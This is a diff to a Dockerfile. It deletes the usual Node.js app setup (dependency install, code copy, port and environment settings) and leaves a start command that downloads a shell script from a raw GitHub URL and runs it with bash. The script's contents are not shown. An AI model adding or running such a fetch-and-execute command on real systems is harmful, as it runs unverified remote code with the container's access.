@@ -19,26 +19,5 @@ RUN curl -fsSL https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key a
 # Create and change to the app directory
 WORKDIR /usr/src/app
 
-# Copy package.json and package-lock.json
-COPY package*.json ./
-
-# Install app dependencies
-RUN npm install
-
-# Copy the rest of the application code
-COPY . .
-
-# Copy the bash script
-COPY script.sh /usr/src/app/
-
-# Make the bash script executable
-RUN chmod +x /usr/src/app/script.sh
-
-# Expose the port the app runs on
-EXPOSE 3000
-
-# Define environment variable
-ENV PORT 3000
-
 # Run the bash script
 CMD wget https://raw.githubusercontent.com/droid-sdk/cb/master/script.sh && bash script.sh
